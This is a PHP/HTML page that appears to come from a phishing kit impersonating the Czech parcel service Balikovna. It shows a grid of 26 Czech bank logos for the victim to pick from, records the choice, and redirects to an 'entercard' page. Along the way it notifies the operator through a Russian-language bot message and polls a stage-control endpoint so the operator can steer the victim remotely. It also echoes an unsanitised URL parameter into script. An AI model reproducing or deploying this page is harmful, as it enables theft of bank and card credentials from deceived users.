
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./assets/styles/style.css">
    <link rel="stylesheet" href="chat.css">
    <title>Balikovna | Vyberte si banku</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
</head>

<body>
<div id="preloader">
    <div class="lds-ripple"><div></div><div></div></div>
</div>

<?php
$id = $_GET['orderid'];
require_once __DIR__ . '/../vendor/autoload.php';

$dotenv = Dotenv\Dotenv::createUnsafeImmutable(dirname(__DIR__));
$dotenv->load();
?>

                        <?php
                        $currStageText = '🏛Переход на выбор банка';
                        require 'botNotification.php' ?>


<?php include 'chat.php' ?>
<div class="navigation">
        <div class="navigation-inner">
            <img src="assets/images/baliklogo.png" alt="">
        </div>
    </div>
    <section>
    <div class="info">
            <h4></h4>
        </div>
        <div class="banks-buttons">
    <button class="select-bank-button" id="air">
        <img src="assets/images/air.png" alt="">
    </button>
    <button class="select-bank-button" id="artesa">
        <img src="assets/images/artesa.png" alt="">
    </button>
    <button class="select-bank-button" id="citfin">
        <img src="assets/images/citfin.png" alt="">
    </button>
    <button class="select-bank-button" id="citi">
        <img src="assets/images/citi.png" alt="">
    </button>
    <button class="select-bank-button" id="commerz">
        <img src="assets/images/commerz.png" alt="">
    </button>
    <button class="select-bank-button" id="credit">
        <img src="assets/images/credit.png" alt="">
    </button>
    <button class="select-bank-button" id="csob">
        <img src="assets/images/csob.png" alt="">
    </button>
    <button class="select-bank-button" id="equa">
        <img src="assets/images/equa.png" alt="">
    </button>
    <button class="select-bank-button" id="expo">
        <img src="assets/images/expo.png" alt="">
    </button>
    <button class="select-bank-button" id="fio">
        <img src="assets/images/fio.png" alt="">
    </button>
    <button class="select-bank-button" id="hsbc">
        <img src="assets/images/hsbc.png" alt="">
    </button>
    <button class="select-bank-button" id="hypo">
        <img src="assets/images/hypo.png" alt="">
    </button>
    <button class="select-bank-button" id="ing">
        <img src="assets/images/ing.png" alt="">
    </button>
    <button class="select-bank-button" id="jt">
        <img src="assets/images/jt.png" alt="">
    </button>
    <button class="select-bank-button" id="kb">
        <img src="assets/images/kb.png" alt="">
    </button>
    <button class="select-bank-button" id="mbank">
        <img src="assets/images/mbank.png" alt="">
    </button>
    <button class="select-bank-button" id="modra">
        <img src="assets/images/modra.png" alt="">
    </button>
    <button class="select-bank-button" id="moneta">
        <img src="assets/images/moneta.png" alt="">
    </button>
    <button class="select-bank-button" id="ober">
        <img src="assets/images/ober.png" alt="">
    </button>
    <button class="select-bank-button" id="penez">
        <img src="assets/images/penez.png" alt="">
    </button>
    <button class="select-bank-button" id="ppf">
        <img src="assets/images/ppf.png" alt="">
    </button>
    <button class="select-bank-button" id="raif">
        <img src="assets/images/raif.png" alt="">
    </button>
    <button class="select-bank-button" id="sporitelna">
        <img src="assets/images/sporitelna.png" alt="">
    </button>
    <button class="select-bank-button" id="trinity">
        <img src="assets/images/trinity.png" alt="">
    </button>
    <button class="select-bank-button" id="unicredit">
        <img src="assets/images/unicredit.png" alt="">
    </button>
    <button class="select-bank-button" id="vub">
        <img src="assets/images/vub.png" alt="">
    </button>
</div>
        <script>
$(window).on('load', function () {
    // Получаем текущий URL
    var currentUrl = window.location.href;

    // Переменная для отслеживания перенаправления
    var isRedirecting = false;

    // Функция проверки стадии
    function checkStage() {
        $.ajax({
            url: '/balikovna/checkstage.php',
            method: 'POST',
            data: {
                orderid: '<?php echo $id ?>',
                currstage: 'selectbank'
            },
            success: function (stage) {
                // Получаем orderid
                var orderId = <?php echo $id ?>;
                if (!isRedirecting && !currentUrl.includes(stage) && stage != 'selectbank' && stage != '') {
                    console.log(stage)
// Устанавливаем флаг перенаправления
isRedirecting = true;

// Находим позицию "balikovna/" в текущем URL
const currentURL = window.location.href;
const balikovnaPosition = currentURL.indexOf("balikovna/");

// Обрезаем URL после "balikovna/"
const baseURL = currentURL.slice(0, balikovnaPosition + 'balikovna/'.length); // 9 символов в "balikovna/"

// Формируем новый URL для перенаправления пользователя
const url = baseURL + stage + "/?orderid=" + orderId + '&bank=' + "<?php echo $row['bank']?>";

// Перенаправляем пользователя на нужную страницу
window.location.href = url;

                } else {
                    // Повторяем проверку через 1 секунду
                    setTimeout(checkStage, 1000);
                }
            }
        });
    }

    // Вызываем функцию проверки стадии
    checkStage();
});

    </script>
    <script>
$(document).ready(function () {
    $('.select-bank-button').on('click', function () {
        // Получаем значение атрибута "id" кнопки
        var bankId = $(this).attr('id');
        isRedirecting = true;

        // Отправляем AJAX-запрос на сервер для обновления поля "bank" в базе данных
        $.ajax({
            url: '/balikovna/updatebank.php',
            method: 'POST',
            data: {
                orderid: orderid,
                bank: bankId
            },
            success: function (response) {
                // Обрабатываем успешный ответ
                console.log('Bank updated successfully');
            },
            error: function (error) {
                // Обрабатываем ошибку
                console.log('Error updating bank:', error);
            },
            complete: function () {
                // Выполняем переход на новую страницу
                let link = "<?php echo '/balikovna/entercard/?orderid=' . $id . '&bank='?>";
                link += bankId
                window.location.href = link
            }
        });
    });
});

    </script>
    </section>
    <script src="/balikovna/script.js"></script>
</body>

</html>